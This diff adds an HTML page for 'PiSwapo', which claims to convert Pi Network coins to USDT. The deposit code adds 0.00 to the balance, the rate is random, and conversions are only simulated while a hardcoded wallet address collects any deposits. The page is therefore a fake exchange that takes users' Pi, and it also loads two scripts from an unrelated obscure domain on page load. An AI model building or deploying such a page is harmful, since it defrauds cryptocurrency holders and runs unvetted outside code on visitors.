@@ -1,0 +1,798 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="description" content="Convert your Pi (PI) to USDT instantly with real-time exchange rates. Deposit Pi, check live conversion rates, and withdraw USDT securely.">
+    <meta name="keywords" content="Pi to USDT, Pi Network, Pi Coin, USDT Exchange, Crypto Converter, Convert Pi to Tether">
+    <meta name="author" content="Your Name">
+    <meta property="og:title" content="Pi to USDT Converter - Live Exchange">
+    <meta property="og:description" content="Easily swap Pi (PI) for USDT with real-time conversion rates. Deposit Pi, check live exchange rates, and withdraw USDT securely.">
+    <meta property="og:image" content="https://s2.coinmarketcap.com/static/img/coins/64x64/35697.png">
+    <meta property="og:url" content="https://yourwebsite.com">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Pi to USDT Converter">
+    <meta name="twitter:description" content="Convert Pi (PI) to USDT with live exchange rates. Deposit, swap, and withdraw securely.">
+    <meta name="twitter:image" content="https://s2.coinmarketcap.com/static/img/coins/64x64/35697.png">
+    <title>Pi to USDT Converter</title>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+    />
+    <style>
+      :root {
+        --primary: #6a1b9a;
+        --primary-light: #9c4dcc;
+        --primary-dark: #38006b;
+        --secondary: #00bcd4;
+        --text-light: #ffffff;
+        --text-dark: #333333;
+        --background: #f4f7f9;
+        --card-bg: #ffffff;
+        --success: #4caf50;
+        --error: #f44336;
+      }
+
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      }
+
+      body {
+        background-color: var(--background);
+        color: var(--text-dark);
+        transition: all 0.3s ease;
+      }
+
+      .container {
+        max-width: 800px;
+        margin: 0 auto;
+        padding: 20px;
+      }
+
+      header {
+        background: linear-gradient(
+          135deg,
+          var(--primary),
+          var(--primary-dark)
+        );
+        color: var(--text-light);
+        padding: 20px;
+        text-align: center;
+        border-radius: 12px;
+        margin-bottom: 20px;
+        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+        position: relative;
+        overflow: hidden;
+      }
+
+      header::before {
+        content: "";
+        position: absolute;
+        top: -50%;
+        left: -50%;
+        width: 200%;
+        height: 200%;
+        background: radial-gradient(
+          circle,
+          rgba(255, 255, 255, 0.1) 0%,
+          rgba(255, 255, 255, 0) 70%
+        );
+        transform: rotate(30deg);
+        z-index: 1;
+      }
+
+      .header-content {
+        position: relative;
+        z-index: 2;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        flex-direction: column;
+      }
+
+      .logo-container {
+        display: flex;
+        align-items: center;
+        margin-bottom: 10px;
+      }
+
+      .logo {
+        width: 60px;
+        height: 60px;
+        border-radius: 50%;
+        object-fit: cover;
+        margin-right: 15px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+        transition: transform 0.3s ease;
+      }
+
+      .logo:hover {
+        transform: scale(1.1);
+      }
+
+      h1 {
+        font-size: 2rem;
+        margin: 10px 0;
+        text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.3);
+      }
+
+      .user-id {
+        background-color: rgba(255, 255, 255, 0.2);
+        padding: 5px 10px;
+        border-radius: 20px;
+        font-size: 0.9rem;
+        margin-top: 10px;
+      }
+
+      section {
+        background-color: var(--card-bg);
+        padding: 25px;
+        margin-bottom: 20px;
+        border-radius: 12px;
+        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
+        transition: transform 0.3s ease, box-shadow 0.3s ease;
+      }
+
+      section:hover {
+        transform: translateY(-5px);
+        box-shadow: 0 6px 20px rgba(0, 0, 0, 0.1);
+      }
+
+      h2 {
+        color: var(--primary);
+        margin-bottom: 15px;
+        font-weight: 600;
+        display: flex;
+        align-items: center;
+      }
+
+      h2 i {
+        margin-right: 10px;
+      }
+
+      .balance-display {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        margin-bottom: 20px;
+      }
+
+      .balance-amount {
+        font-size: 1.8rem;
+        font-weight: bold;
+        color: var(--primary);
+      }
+
+      .wallet-info {
+        background-color: rgba(106, 27, 154, 0.05);
+        padding: 15px;
+        border-radius: 8px;
+        margin: 15px 0;
+        display: none;
+        animation: fadeIn 0.5s ease;
+      }
+
+      .wallet-address {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        background-color: rgba(255, 255, 255, 0.8);
+        padding: 10px 15px;
+        border-radius: 6px;
+        margin-top: 10px;
+        border: 1px solid #e0e0e0;
+      }
+
+      .address-text {
+        font-family: monospace;
+        font-size: 1rem;
+        word-break: break-all;
+      }
+
+      .copy-btn {
+        background: none;
+        border: none;
+        color: var(--primary);
+        cursor: pointer;
+        font-size: 1.2rem;
+        transition: transform 0.2s ease;
+      }
+
+      .copy-btn:hover {
+        transform: scale(1.1);
+      }
+
+      .copy-success {
+        color: var(--success);
+        font-size: 0.8rem;
+        margin-left: 10px;
+        opacity: 0;
+        transition: opacity 0.3s ease;
+      }
+
+      label {
+        display: block;
+        margin-top: 15px;
+        margin-bottom: 5px;
+        font-weight: 500;
+        color: var(--text-dark);
+      }
+
+      input {
+        width: 100%;
+        padding: 12px;
+        margin-bottom: 15px;
+        border: 1px solid #ddd;
+        border-radius: 6px;
+        font-size: 1rem;
+        transition: border 0.3s ease, box-shadow 0.3s ease;
+      }
+
+      input:focus {
+        outline: none;
+        border-color: var(--primary-light);
+        box-shadow: 0 0 0 3px rgba(106, 27, 154, 0.1);
+      }
+
+      button {
+        background-color: var(--primary);
+        color: white;
+        padding: 12px 20px;
+        border: none;
+        border-radius: 6px;
+        cursor: pointer;
+        font-size: 1rem;
+        font-weight: 500;
+        transition: background-color 0.3s ease, transform 0.2s ease;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+
+      button i {
+        margin-right: 8px;
+      }
+
+      button:hover {
+        background-color: var(--primary-light);
+        transform: translateY(-2px);
+      }
+
+      button:active {
+        transform: translateY(0);
+      }
+
+      button:disabled {
+        background-color: #cccccc;
+        cursor: not-allowed;
+        transform: none;
+      }
+
+      .currency-input {
+        position: relative;
+      }
+
+      .currency-icon {
+        position: absolute;
+        top: 12px;
+        left: 12px;
+        width: 24px;
+        height: 24px;
+        border-radius: 50%;
+      }
+
+      .currency-input input {
+        padding-left: 45px;
+      }
+
+      .rate-display {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin: 20px 0;
+        gap: 15px;
+      }
+
+      .rate-arrow {
+        font-size: 1.5rem;
+        color: var(--primary);
+      }
+
+      .currency-card {
+        display: flex;
+        align-items: center;
+        background-color: rgba(106, 27, 154, 0.05);
+        padding: 10px 15px;
+        border-radius: 8px;
+        min-width: 120px;
+      }
+
+      .currency-card img {
+        width: 30px;
+        height: 30px;
+        margin-right: 10px;
+        border-radius: 50%;
+      }
+
+      .loader-container {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100px;
+      }
+
+      .loader {
+        border: 4px solid rgba(106, 27, 154, 0.1);
+        border-radius: 50%;
+        border-top: 4px solid var(--primary);
+        width: 40px;
+        height: 40px;
+        animation: spin 1s linear infinite;
+      }
+
+      .transaction-success {
+        display: none;
+        background-color: rgba(76, 175, 80, 0.1);
+        color: var(--success);
+        padding: 15px;
+        border-radius: 8px;
+        margin-top: 20px;
+        text-align: center;
+        animation: fadeIn 0.5s ease;
+      }
+
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+          transform: translateY(10px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      @keyframes pulse {
+        0% {
+          transform: scale(1);
+        }
+        50% {
+          transform: scale(1.05);
+        }
+        100% {
+          transform: scale(1);
+        }
+      }
+
+      @media (max-width: 768px) {
+        .container {
+          padding: 10px;
+        }
+
+        header {
+          padding: 15px;
+        }
+
+        h1 {
+          font-size: 1.5rem;
+        }
+
+        section {
+          padding: 20px;
+        }
+
+        .balance-amount {
+          font-size: 1.5rem;
+        }
+      }
+    </style>
+    <script type='text/javascript' src='//slushhelmetmirth.com/d9/80/e5/d980e590b722c4683cfae79509f8e82e.js'></script>
+  </head>
+  <body>
+    <div class="container">
+      <header>
+        <div class="header-content">
+          <div class="logo-container">
+            <img
+              src="https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/db/a3/69/dba3695e-4004-702e-5655-0a104b5a8464/PiIcon-0-0-1x_U007emarketing-0-6-0-85-220.png/492x0w.webp"
+              alt="Pi Network Logo"
+              class="logo"
+            />
+          </div>
+          <h1>PiSwapo</h1>
+          <div class="user-id">
+            User ID: <span id="user-id">Loading...</span>
+          </div>
+        </div>
+      </header>
+
+      <section class="balance-section">
+        <h2><i class="fas fa-wallet"></i> Your Pi Balance</h2>
+        <div class="balance-display">
+          <div class="balance-amount" id="pi-balance">0.00 PI</div>
+          <button id="deposit-button">
+            <i class="fas fa-plus-circle"></i> Deposit Pi
+          </button>
+        </div>
+
+        <div class="wallet-info" id="wallet-info">
+          <p>Your Pi Wallet Address:</p>
+          <div class="wallet-address">
+            <span class="address-text" id="wallet-address"
+              >GCLR3AVZ2P5XL7VAEN7YIJG7Z5NKKH354NI5BSVB2F5KXFFB57F5IOVK</span
+            >
+            <button class="copy-btn" id="copy-address">
+              <i class="fas fa-copy"></i>
+            </button>
+            <span class="copy-success" id="copy-success">Copied!</span>
+          </div>
+        </div>
+      </section>
+
+      <section class="conversion-section">
+        <h2><i class="fas fa-exchange-alt"></i> Convert Pi to USDT</h2>
+
+        <div class="rate-display">
+          <div class="currency-card">
+            <img
+              src="https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/db/a3/69/dba3695e-4004-702e-5655-0a104b5a8464/PiIcon-0-0-1x_U007emarketing-0-6-0-85-220.png/492x0w.webp"
+              alt="Pi Coin"
+            />
+            <span>1 PI</span>
+          </div>
+          <div class="rate-arrow">
+            <i class="fas fa-equals"></i>
+          </div>
+          <div class="currency-card">
+            <img
+              src="https://cryptologos.cc/logos/tether-usdt-logo.png"
+              alt="USDT"
+            />
+            <span id="conversion-rate">...</span>
+          </div>
+        </div>
+
+        <form id="conversion-form">
+          <div class="currency-input">
+            <img
+              src="https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/db/a3/69/dba3695e-4004-702e-5655-0a104b5a8464/PiIcon-0-0-1x_U007emarketing-0-6-0-85-220.png/492x0w.webp"
+              alt="Pi Coin"
+              class="currency-icon"
+            />
+            <label for="pi-amount">Amount of Pi to Convert:</label>
+            <input
+              type="number"
+              id="pi-amount"
+              min="1"
+              step="0.01"
+              placeholder="Enter amount"
+              required
+            />
+          </div>
+
+          <div class="currency-input">
+            <img
+              src="https://cryptologos.cc/logos/tether-usdt-logo.png"
+              alt="USDT"
+              class="currency-icon"
+            />
+            <label for="usdt-amount">You will receive (USDT):</label>
+            <input type="text" id="usdt-amount" readonly />
+          </div>
+
+          <label for="usdt-address">Your USDT Address:</label>
+          <input
+            type="text"
+            id="usdt-address"
+            placeholder="Enter your USDT wallet address"
+            required
+          />
+
+          <label for="memo">Memo (Optional):</label>
+          <input
+            type="text"
+            id="memo"
+            placeholder="Add a memo for this transaction"
+          />
+
+          <button type="submit" id="convert-button" disabled>
+            <i class="fas fa-exchange-alt"></i> Convert to USDT
+          </button>
+        </form>
+
+        <div id="transaction-success" class="transaction-success">
+          <i
+            class="fas fa-check-circle"
+            style="font-size: 2rem; margin-bottom: 10px"
+          ></i>
+          <h3>Transaction Successful!</h3>
+          <p id="transaction-details"></p>
+        </div>
+      </section>
+
+      <section class="history-section">
+        <h2><i class="fas fa-history"></i> Recent Transactions</h2>
+        <div id="transaction-history">
+          <div class="loader-container" id="history-loader">
+            <div class="loader"></div>
+          </div>
+          <p id="no-transactions" style="text-align: center; display: none">
+            No transactions yet
+          </p>
+        </div>
+      </section>
+    </div>
+    
+    <script type='text/javascript' src='//slushhelmetmirth.com/7a/ea/37/7aea374aead78bb3565a57a14614b80d.js'></script>
+
+    <script>
+      document.addEventListener("DOMContentLoaded", () => {
+        // Generate a random 4-digit user ID
+        const userId = Math.floor(1000 + Math.random() * 9000);
+        document.getElementById("user-id").textContent = userId;
+
+        // Elements
+        const piBalanceElement = document.getElementById("pi-balance");
+        const depositButton = document.getElementById("deposit-button");
+        const walletInfo = document.getElementById("wallet-info");
+        const copyAddressButton = document.getElementById("copy-address");
+        const copySuccess = document.getElementById("copy-success");
+        const piAmountInput = document.getElementById("pi-amount");
+        const usdtAmountInput = document.getElementById("usdt-amount");
+        const convertButton = document.getElementById("convert-button");
+        const conversionRateElement =
+          document.getElementById("conversion-rate");
+        const conversionForm = document.getElementById("conversion-form");
+        const transactionSuccess = document.getElementById(
+          "transaction-success"
+        );
+        const transactionDetails = document.getElementById(
+          "transaction-details"
+        );
+        const historyLoader = document.getElementById("history-loader");
+        const noTransactions = document.getElementById("no-transactions");
+        const transactionHistory = document.getElementById(
+          "transaction-history"
+        );
+
+        // State variables
+        let piBalance = 0.0;
+        let conversionRate = 0.0;
+        let transactions = [];
+
+        // Function to update the displayed Pi balance
+        function updatePiBalance() {
+          piBalanceElement.textContent = `${piBalance.toFixed(2)} PI`;
+          convertButton.disabled = piBalance < 1;
+        }
+
+        // Function to calculate USDT amount based on Pi amount
+        function calculateUsdtAmount() {
+          const piAmount = parseFloat(piAmountInput.value) || 0;
+          const usdtAmount = piAmount * conversionRate;
+          usdtAmountInput.value = usdtAmount.toFixed(2);
+        }
+
+        // Fetch the real-time conversion rate
+        async function fetchConversionRate() {
+          conversionRateElement.innerHTML =
+            '<div class="loader" style="width: 20px; height: 20px;"></div>';
+
+          try {
+            // Simulate API call with a delay
+            await new Promise((resolve) => setTimeout(resolve, 1500));
+
+            // For demo purposes, using a fixed rate
+            // In a real app, you would fetch from an API
+            conversionRate = (Math.random() * (3.5 - 2.5) + 2.5).toFixed(2);
+            conversionRateElement.textContent = `${conversionRate} USDT`;
+
+            // Update USDT amount if Pi amount is entered
+            calculateUsdtAmount();
+          } catch (error) {
+            console.error("Error fetching conversion rate:", error);
+            conversionRateElement.textContent = "Error";
+          }
+        }
+
+        // Function to display transaction history
+        function displayTransactionHistory() {
+          historyLoader.style.display = "none";
+
+          if (transactions.length === 0) {
+            noTransactions.style.display = "block";
+            return;
+          }
+
+          noTransactions.style.display = "none";
+
+          // Clear previous history
+          const existingHistory =
+            document.querySelectorAll(".transaction-item");
+          existingHistory.forEach((item) => item.remove());
+
+          // Create transaction items
+          transactions.forEach((transaction) => {
+            const transactionItem = document.createElement("div");
+            transactionItem.className = "transaction-item";
+            transactionItem.style.padding = "15px";
+            transactionItem.style.borderBottom = "1px solid #eee";
+            transactionItem.style.display = "flex";
+            transactionItem.style.justifyContent = "space-between";
+            transactionItem.style.animation = "fadeIn 0.5s ease";
+
+            const leftSide = document.createElement("div");
+
+            const date = document.createElement("div");
+            date.style.fontSize = "0.8rem";
+            date.style.color = "#888";
+            date.textContent = transaction.date;
+            leftSide.appendChild(date);
+
+            const details = document.createElement("div");
+            details.style.fontWeight = "500";
+            details.textContent = `${transaction.piAmount} PI → ${transaction.usdtAmount} USDT`;
+            leftSide.appendChild(details);
+
+            const address = document.createElement("div");
+            address.style.fontSize = "0.8rem";
+            address.style.color = "#888";
+            address.textContent = `To: ${transaction.usdtAddress.substring(
+              0,
+              10
+            )}...`;
+            leftSide.appendChild(address);
+
+            const status = document.createElement("div");
+            status.style.color = "#4caf50";
+            status.style.fontWeight = "500";
+            status.textContent = "Completed";
+
+            transactionItem.appendChild(leftSide);
+            transactionItem.appendChild(status);
+
+            transactionHistory.appendChild(transactionItem);
+          });
+        }
+
+        // Event listener for the deposit button
+        depositButton.addEventListener("click", () => {
+          walletInfo.style.display = "block";
+
+          // Simulate deposit modal with prompt
+          const depositAmount = parseFloat(
+            prompt("Enter the amount of Pi to deposit:")
+          );
+          if (!isNaN(depositAmount) && depositAmount > 0) {
+            // Show loading animation
+            piBalanceElement.innerHTML =
+              '<div class="loader" style="width: 20px; height: 20px; display: inline-block;"></div>';
+
+            // Simulate processing delay
+            setTimeout(() => {
+              piBalance += 0.00;
+              updatePiBalance();
+
+              // Animate balance change
+              piBalanceElement.style.animation = "pulse 0.5s ease";
+              setTimeout(() => {
+                piBalanceElement.style.animation = "";
+              }, 500);
+            }, 1000);
+          } else if (!isNaN(depositAmount)) {
+            alert("Please enter a valid amount greater than 0.");
+          }
+        });
+
+        // Copy wallet address to clipboard
+        copyAddressButton.addEventListener("click", () => {
+          const walletAddress =
+            document.getElementById("wallet-address").textContent;
+          navigator.clipboard.writeText(walletAddress).then(() => {
+            copySuccess.style.opacity = "1";
+            setTimeout(() => {
+              copySuccess.style.opacity = "0";
+            }, 2000);
+          });
+        });
+
+  // Update USDT amount when Pi amount changes
+        piAmountInput.addEventListener("input", calculateUsdtAmount);
+
+        // Event listener for the conversion form submission
+        conversionForm.addEventListener("submit", (event) => {
+          event.preventDefault();
+          const piAmount = parseFloat(piAmountInput.value);
+          const usdtAmount = parseFloat(usdtAmountInput.value);
+          const usdtAddress = document.getElementById("usdt-address").value;
+          const memo = document.getElementById("memo").value;
+
+          if (piAmount > piBalance) {
+            alert("Insufficient Pi balance.");
+            return;
+          }
+
+          if (!usdtAddress) {
+            alert("Please enter a valid USDT address.");
+            return;
+          }
+
+          // Disable the convert button and show loading
+          convertButton.disabled = true;
+          convertButton.innerHTML =
+            '<div class="loader" style="width: 20px; height: 20px; display: inline-block;"></div> Processing...';
+
+          // Simulate transaction processing
+          setTimeout(() => {
+            // Add to transaction history
+            const transaction = {
+              date: new Date().toLocaleString(),
+              piAmount: piAmount.toFixed(2),
+              usdtAmount: usdtAmount.toFixed(2),
+              usdtAddress: usdtAddress,
+              memo: memo,
+            };
+
+            transactions.unshift(transaction);
+
+            // Show success message
+            transactionDetails.textContent = `${piAmount.toFixed(
+              2
+            )} PI converted to ${usdtAmount.toFixed(
+              2
+            )} USDT and sent to ${usdtAddress.substring(0, 10)}...`;
+            transactionSuccess.style.display = "block";
+
+            // Deduct Pi from user balance
+            piBalance -= piAmount;
+            updatePiBalance();
+
+            // Update transaction history
+            displayTransactionHistory();
+
+            // Reset form
+            piAmountInput.value = "";
+            usdtAmountInput.value = "";
+            document.getElementById("usdt-address").value = "";
+            document.getElementById("memo").value = "";
+
+            // Reset button
+            convertButton.innerHTML =
+              '<i class="fas fa-exchange-alt"></i> Convert to USDT';
+            convertButton.disabled = true;
+
+            // Hide success message after a delay
+            setTimeout(() => {
+              transactionSuccess.style.display = "none";
+            }, 5000);
+          }, 2000);
+        });
+
+        // Initialize
+        fetchConversionRate();
+        updatePiBalance();
+
+        // Simulate loading transaction history
+        setTimeout(() => {
+          displayTransactionHistory();
+        }, 1500);
+
+        // Refresh conversion rate periodically
+        setInterval(fetchConversionRate, 60000);
+      });
+    </script>
+  </body>
+</html>
+        
